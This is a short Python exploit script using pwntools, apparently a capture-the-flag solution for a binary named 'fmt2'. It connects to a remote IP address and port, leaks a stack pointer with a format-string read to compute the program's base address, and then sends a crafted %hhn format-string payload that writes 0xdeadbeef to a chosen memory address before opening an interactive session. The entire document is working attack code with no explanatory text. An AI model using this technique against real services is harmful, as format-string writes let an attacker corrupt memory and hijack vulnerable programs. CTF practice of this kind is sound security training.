from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process('../dist/fmt2')
s=remote("8.130.35.16",52001)
#pause()
s.sendlineafter(b"content: ",b"%33$p")
elf_base=eval(s.recv(14))-0x1280
target=elf_base+0x4048
p=f"%{0xef}c%12$hhn%{0x100-0xef+0xbe}c%13$hhn%{0x100-0xbe+0xad}c%14$hhn%{0xde-0xad}c%15$hhna".encode()
for i in range(4):
    p+=p64(target+i)
s.sendafter(b"content: ",p)
s.interactive()
